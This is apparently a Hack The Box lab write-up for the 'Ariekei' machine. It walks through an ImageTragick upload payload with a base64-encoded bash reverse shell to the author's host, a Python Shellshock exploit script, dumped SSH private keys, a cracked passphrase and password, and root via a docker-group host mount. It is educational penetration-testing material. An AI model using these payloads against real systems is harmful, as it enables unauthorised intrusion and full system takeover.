# Ariekei
>Author : Xyan1d3
>Date : 21st July 2021
>IP : 10.10.10.65
>OS : Linux
>Difficulty : Insane

# Initial Enumeration
## Nmap
```sql
# Nmap 7.91 scan initiated Wed Jul 21 01:03:53 2021 as: nmap -sC -sV -v -oN nmap/ariekei 10.10.10.65
Nmap scan report for 10.10.10.65
Host is up (0.10s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
|   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
|_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
443/tcp  open  ssl/http nginx 1.10.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.10.2
|_http-title: Site Maintenance
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
| Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
| Issuer: stateOrProvinceName=Texas/countryName=US
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-09-24T01:37:05
| Not valid after:  2045-02-08T01:37:05
| MD5:   d73e ffe4 5f97 52ca 64dc 7770 abd0 2b7f
|_SHA-1: 1138 148e dfbd 6ad8 367b 08c8 1725 7408 eedb 4a7b
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
1022/tcp open  ssh      OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
|   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
|   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
|_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Here, We see an intersting fact that we have 2 `SSH` ports with two different Fingerprints.

## Web Enumeration
SSL Certificate leaks `2` domain names.
![[Pasted image 20210721180128.png]]
```txt
calvin.ariekei.htb
beehive.ariekei.htb
```

We could add these lines into the `/etc/hosts`.

We take a look at the `https://10.10.10.65` shows this page.
![[Pasted image 20210721180723.png]]

The website is vulnerable to `Shellshock` but on exploiting it shows us a troll face.
![[Pasted image 20210721214444.png]]

### Gobuster on `https://10.10.10.65`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # gobuster dir -u https://10.10.10.65/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster443.out -t 50 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://10.10.10.65/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/21 18:06:51 Starting gobuster in directory enumeration mode
===============================================================
/blog                 (Status: 301) [Size: 309] [--> http://10.10.10.65/blog/]
```

Here, We don't have much to see.

We could enumerate the `http://calvin.ariekei.htb` which gives us a `404 Not Found` page.
![[Pasted image 20210721184305.png]]

### Gobuster on `https://calvin.ariekei.htb`
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # gobuster dir -u https://calvin.ariekei.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-calvin.out -t 50 -k
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://calvin.ariekei.htb/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/07/21 18:06:51 Starting gobuster in directory enumeration mode
===============================================================
/upload               (Status: 200) [Size: 1656]
```

We see an upload page with image upload option.
![[Pasted image 20210721184522.png]]

The source code shows two clown faces `happy` and `sad` which gives us the fact that it may be vulnerable to the `imagetragick` exploit.
![[Pasted image 20210721184628.png]]

# Initial FootHold as root on calvin
We create a file with the following contents.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei/www]
└──╼ # cat magisk.mvg
push graphic-context 
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy84ODg4IDA+JjE= |base64 -d|bash;rm -rf "/dev/null)'
pop graphic-context
```

We get a shell back as `root` on `calvin`.
![[Pasted image 20210721184911.png]]
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # shelter rev bash
[+] Copied reverseshell payload echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMy84ODg4IDA+JjE= |base64 -d|bash
[+] Starting up Shell Handler...
Listening on 0.0.0.0 8888
Connection received on 10.10.10.65 40510
[root@calvin app]# whoami
whoami
root
```

We load `ifconfig` on the box and find out our ip address.
```python
[root@calvin ~]# ./ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.23.0.11  netmask 255.255.255.0  broadcast 0.0.0.0
        ether 02:42:ac:17:00:0b  txqueuelen 0  (Ethernet)
        RX packets 1692118  bytes 144621070 (137.9 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1608582  bytes 162556039 (155.0 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
[root@calvin ~]# ./nmap -sn 172.23.0.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2021-07-21 14:44 UTC
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for 172.23.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (0.000050s latency).
MAC Address: 02:42:0E:A6:74:56 (Unknown)
Nmap scan report for waf-live.arieka-live-net (172.23.0.252)
Host is up (-0.10s latency).
MAC Address: 02:42:AC:17:00:FC (Unknown)
Nmap scan report for bastion-live.arieka-live-net (172.23.0.253)
Host is up (-0.10s latency).
MAC Address: 02:42:AC:17:00:FD (Unknown)
Nmap scan report for calvin.ariekei.htb (172.23.0.11)
Host is up.
Nmap done: 256 IP addresses (4 hosts up) scanned in 15.03 seconds
```

We find out some `hostnames` and ip.
```python
[root@calvin common]# ls -la
total 20
drwxr-xr-x  5 root root 4096 Sep 23  2017 .
drwxr-xr-x 36 root root 4096 Nov 13  2017 ..
drwxrwxr-x  2 root root 4096 Sep 24  2017 .secrets
drwxr-xr-x  6 root root 4096 Sep 23  2017 containers
drwxr-xr-x  2 root root 4096 Sep 24  2017 network
[root@calvin common]# cd .secrets/
[root@calvin .secrets]# ls -la
total 16
drwxrwxr-x 2 root root 4096 Sep 24  2017 .
drwxr-xr-x 5 root root 4096 Sep 23  2017 ..
-r--r----- 1 root root 1679 Sep 23  2017 bastion_key
-r--r----- 1 root root  393 Sep 23  2017 bastion_key.pub
```

We get that we have the `SSH` keys which we can use on the box.
```python
[root@calvin ~]# cd /common/.secrets/
[root@calvin .secrets]# ls -l
total 8
-r--r----- 1 root root 1679 Sep 23  2017 bastion_key
-r--r----- 1 root root  393 Sep 23  2017 bastion_key.pub
[root@calvin .secrets]# cat bastion_key
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA8M2fLV0chunp+lPHeK/6C/36cdgMPldtrvHSYzZ0j/Y5cvkR
SZPGfmijBUyGCfqK48jMYnqjLcmHVTlA7wmpzJwoZj2yFqsOlM3Vfp5wa1kxP+JH
g0kZ/Io7NdLTz4gQww6akH9tV4oslHw9EZAJd4CZOocO8B31hIpUdSln5WzQJWrv
pXzPWDhS22KxZqSp2Yr6pA7bhD35yFQ7q0tgogwvqEvn5z9pxnCDHnPeYoj6SeDI
T723ZW/lAsVehaDbXoU/XImbpA9MSF2pMAMBpT5RUG80KqhIxIeZbb52iRukMz3y
5welIrPJLtDTQ4ra3gZtgWvbCfDaV4eOiIIYYQIDAQABAoIBAQDOIAUojLKVnfeG
K17tJR3SVBakir54QtiFz0Q7XurKLIeiricpJ1Da9fDN4WI/enKXZ1Pk3Ht//ylU
P00hENGDbwx58EfYdZZmtAcTesZabZ/lwmlarSGMdjsW6KAc3qkSfxa5qApNy947
QFn6BaTE4ZTIb8HOsqZuTQbcv5PK4v/x/Pe1JTucb6fYF9iT3A/pnXnLrN9AIFBK
/GB02ay3XDkTPh4HfgROHbkwwverzC78RzjMe8cG831TwWa+924u+Pug53GUOwet
A+nCVJSxHvgHuNA2b2oMfsuyS0i7NfPKumjO5hhfLex+SQKOzRXzRXX48LP8hDB0
G75JF/W9AoGBAPvGa7H0Wen3Yg8n1yehy6W8Iqek0KHR17EE4Tk4sjuDL0jiEkWl
WlzQp5Cg6YBtQoICugPSPjjRpu3GK6hI/sG9SGzGJVkgS4QIGUN1g3cP0AIFK08c
41xJOikN+oNInsb2RJ3zSHCsQgERHgMdfGZVQNYcKQz0lO+8U0lEEe1zAoGBAPTY
EWZlh+OMxGlLo4Um89cuUUutPbEaDuvcd5R85H9Ihag6DS5N3mhEjZE/XS27y7wS
3Q4ilYh8Twk6m4REMHeYwz4n0QZ8NH9n6TVxReDsgrBj2nMPVOQaji2xn4L7WYaJ
KImQ+AR9ykV2IlZ42LoyaIntX7IsRC2O/LbkJm3bAoGAFvFZ1vmBSAS29tKWlJH1
0MB4F/a43EYW9ZaQP3qfIzUtFeMj7xzGQzbwTgmbvYw3R0mgUcDS0rKoF3q7d7ZP
ILBy7RaRSLHcr8ddJfyLYkoallSKQcdMIJi7qAoSDeyMK209i3cj3sCTsy0wIvCI
6XpTUi92vit7du0eWcrOJ2kCgYAjrLvUTKThHeicYv3/b66FwuTrfuGHRYG5EhWG
WDA+74Ux/ste3M+0J5DtAeuEt2E3FRSKc7WP/nTRpm10dy8MrgB8tPZ62GwZyD0t
oUSKQkvEgbgZnblDxy7CL6hLQG5J8QAsEyhgFyf6uPzF1rPVZXTf6+tOna6NaNEf
oNyMkwKBgQCCCVKHRFC7na/8qMwuHEb6uRfsQV81pna5mLi55PV6RHxnoZ2wOdTA
jFhkdTVmzkkP62Yxd+DZ8RN+jOEs+cigpPjlhjeFJ+iN7mCZoA7UW/NeAR1GbjOe
BJBoz1pQBtLPQSGPaw+x7rHwgRMAj/LMLTI46fMFAWXB2AzaHHDNPg==
-----END RSA PRIVATE KEY-----
[root@calvin .secrets]# cat bastion_key.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka
```

# User Escalation to root on ezra
We could use the keys to `SSH` keys on the box.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # ssh -i bastion.pem root@10.10.10.65 -p 1022
Last login: Wed Jul 21 15:38:15 2021 from 10.10.14.23
root@ezra:~# whoami
root
root@ezra:~# id
uid=0(root) gid=0(root) groups=0(root)
```

We check out the `/root/common/containers/waf-live` and `nginx.conf` which shows that we could only access the page when accessing from internal domain.
![[Pasted image 20210721235930.png]]

We also get some credentials on the Dockerfile
```python
root@ezra:/common/containers/blog-test# cat Dockerfile 
FROM internal_htb/docker-apache
RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
RUN apt-get update 
RUN apt-get install python -y
RUN mkdir /common
```
We also see that we have a two networks running
```
root@ezra:/common/network# ls
info.png  make_nets.sh
root@ezra:/common/network# cat make_nets.sh 
#!/bin/bash

# Create isolated network for building containers. No internet access
docker network create -d bridge --subnet=172.24.0.0/24 --gateway=172.24.0.1 --ip-range=172.24.0.0/24 \
 -o com.docker.network.bridge.enable_ip_masquerade=false \
  arieka-test-net

# Crate network for live containers. Internet access
docker network create -d bridge --subnet=172.23.0.0/24 --gateway=172.23.0.1 --ip-range=172.23.0.0/24 \
 arieka-live-net
```

Now, The fact is that we have the access of the two subnets on this box.

|Subnet|Network|
|--|--|
|172.23.0.0/24|arieka-live-net|
|172.24.0.0/24|arieka-test-net|

|Hostname|IP|Ports Open|
|--|--|--|--|
|waf-live.arieka-live-net|172.23.0.252|`443/tcp`|
|bastion-live.arieka-live-net|172.23.0.253|`22/tcp`|
|calvin.ariekei.htb|172.23.0.11|`8080/tcp`|
|blog-test.arieka-test-net|172.24.0.2|`80/tcp`|
|waf-live.arieka-test-net|172.24.0.252|`443/tcp`|
|ezra.ariekei.htb|172.24.0.253|`22/tcp`|

We could now try to do `shellshock` on the `http://172.24.0.2`.

```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # ssh -i bastion.pem -L 80:172.24.0.2:80 root@10.10.10.65 -p 1022
Last login: Wed Jul 21 17:04:27 2021 from 10.10.14.23
root@ezra:~#
```

From on our box we could abuse the `shellshock`.
```python
import requests
url = "http://127.0.0.1/cgi-bin/stats"
input = input("172.24.0.2> ")
payload = "() { :; }; echo; echo; /bin/bash -c \'" + input + "\'"
headers = {"User-Agent" : payload}
r = requests.get(url,headers=headers,verify=False)
print(r.text)
```

![[Pasted image 20210721235816.png]]

# User Escalation to www-data on beehive
We could now get a reverse shell from here to `beehive`.
![[Pasted image 20210722000139.png]]

# Root Escalation to Root on beehive
We use the credentials `Ib3!kTEvYw6*P7s` found earlier to elevate to `root`.
![[Pasted image 20210722002252.png]]

## Getting the user Flag
```python
root@beehive:/home/spanishdancer# ls -l
total 8
drwxrwxr-x 3 1000 root 4096 Sep 16  2017 content
-r--r----- 1 1000 root   33 Sep 24  2017 user.txt
root@beehive:/home/spanishdancer# cat user.txt 
ff0bca827a5f660f6d35df7481e5f216
```

# Initial FootHold as spanishdancer on host
On looking at the `/home/spanishdancer` on the `beehive` docker. We find out that we have an `SSH` Private Key. Which we can try to use on the host to `SSH` into as `spanishdancer`.
```python
root@beehive:/home/spanishdancer/.ssh# ls -la
total 20
drwx------ 2 1000 1000 4096 Sep 24  2017 .
drwxr-xr-x 5 1000 1000 4096 Nov 13  2017 ..
-rw-rw-r-- 1 1000 1000  407 Sep 24  2017 authorized_keys
-rw------- 1 1000 1000 1766 Sep 24  2017 id_rsa
-rw-r--r-- 1 1000 1000  407 Sep 24  2017 id_rsa.pub
root@beehive:/home/spanishdancer/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
Y4sGV/PS/uLm6/tcEpmGiVdcUJHpMECZvnx9aSa/kvuO5pNfdFvnQ4RVA8q/w6vN
p3pDI9CzdnkYmH5/+/QYFsvMk4t1HB5AKO5mRrc1x+QZBhtUDNVAaCu2mnZaSUhE
abZo0oMZHG8sETBJeQRnogPyAjwmAVFy5cDTLgag9HlFhb7MLgq0dgN+ytid9YA8
pqTtx8M98RDhVKqcVG3kzRFc/lJBFKa7YabTBaDoWryR0+6x+ywpaBGsUXEoz6hU
UvLWH134w8PGuR/Rja64s0ZojGYsnHIl05PIntvl9hinDNc0Y9QOmKde91NZFpcj
pDlNoISCc3ONnL4c7xgS5D2oOx+3l2MpxB+B9ua/UNJwccDdJUyoJEnRt59dH1g3
cXvb/zTEklwG/ZLed3hWUw/f71D9DZV+cnSlb9EBWHXvSJwqT1ycsvJRZTSRZeOF
Bh9auWqAHk2SZ61kcXOp+W91O2Wlni2MCeYjLuw6rLUHUcEnUq0zD9x6mRNLpzp3
IC8VFmW03ERheVM6Ilnr8HOcOQnPHgYM5iTM79X70kCWoibACDuEHz/nf6tuLGbv
N01CctfSE+JgoNIIdb4SHxTtbOvUtsayQmV8uqzHpCQ3FMfz6uRvl4ZVvNII/x8D
u+hRPtQ1690Eg9sWqu0Uo87/v6c/XJitNYzDUOmaivoIpL0RO6mu9AhXcBnqBu3h
oPSgeji9U7QJD64T8InvB7MchfaJb9W/VTECST3FzAFPhCe66ZRzRKZSgMwftTi5
hm17wPBuLjovOCM8QWp1i32IgcdrnZn2pBpt94v8/KMwdQyAOOVhkozBNS6Xza4P
18yUX3UiUEP9cmtz7bTRP5h5SlDzhprntaKRiFEHV5SS94Eri7Tylw4KBlkF8lSD
WZmJvAQc4FN+mhbaxagCadCf12+VVNrB3+vJKoUHgaRX+R4P8H3OTKwub1e69vnn
QhChPHmH9SrI2TNsP9NPT5geuTe0XPP3Og3TVzenG7DRrx4Age+0TrMShcMeJQ8D
s3kAiqHs5liGqTG96i1HeqkPms9dTC895Ke0jvIFkQgxPSB6y7oKi7VGs15vs1au
9T6xwBLJQSqMlPewvUUtvMQAdNu5eksupuqBMiJRUQvG9hD0jjXz8f5cCCdtu8NN
8Gu4jcZFmVvsbRCP8rQBKeqc/rqe0bhCtvuMhnl7rtyuIw2zAAqqluFs8zL6YrOw
lBLLZzo0vIfGXV42NBPgSJtc9XM3YSTjbdAk+yBNIK9GEVTbkO9GcMgVaBg5xt+6
uGE5dZmtyuGyD6lj1lKk8D7PbCHTBc9MMryKYnnWt7CuxFDV/Jp4fB+/DuPYL9YQ
8RrdIpShQKh189lo3dc6J00LmCUU5qEPLaM+AGFhpk99010rrZB/EHxmcI0ROh5T
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----
```

We crack the Passphrase with `ssh2john` and `JtR`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # ssh2john.py spanishdancer.pem > ssh.hash
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # john ssh.hash --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
purple1          (spanishdancer.pem)
```

We can `SSH` into the box as `spanishdancer`.
```python
┌─[Magisk@Xyan1d3]─[10.10.14.23]─[~/htb/ariekei]
└──╼ # ssh -i spanishdancer.pem spanishdancer@10.10.10.65
Enter passphrase for key 'spanishdancer.pem': 
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
spanishdancer@ariekei:~$ id
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)
spanishdancer@ariekei:~$ whoami
spanishdancer
```
![[Pasted image 20210722003810.png]]

# Root Escalation on host
We see that we are in the `docker` group which means we could easily get our privilege escalated by mounting the whole host filesystem into a docker container.

We could see the available docker images to use one.
```python
spanishdancer@ariekei:~$ docker image ls
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
waf-template        latest              399c8876e9ae        3 years ago         628MB
bastion-template    latest              0df894ef4624        3 years ago         251MB
web-template        latest              b2a8f8d3ef38        3 years ago         185MB
bash                latest              a66dc6cea720        3 years ago         12.8MB
convert-template    latest              e74161aded79        5 years ago         418MB
```

## Getting the root Flag
```python
spanishdancer@ariekei:~$ docker run --rm -v /:/mnt -it bash bash
bash-4.4# cd /mnt/
bash-4.4# cd root/
bash-4.4# ls -l
total 4
-r--------    1 root     root            33 Sep 24  2017 root.txt
bash-4.4# cat root.txt 
0385b6629b30f8a673f7bb279fb1570b
```
# Credentials
|Username|Password|Location|
|--|--|--|
|root|Ib3!kTEvYw6\*P7s|Beehive Docker Root Password|
|spanishdancer|purple1|SSH Passphrase of the spanishdancer SSH Private Key|
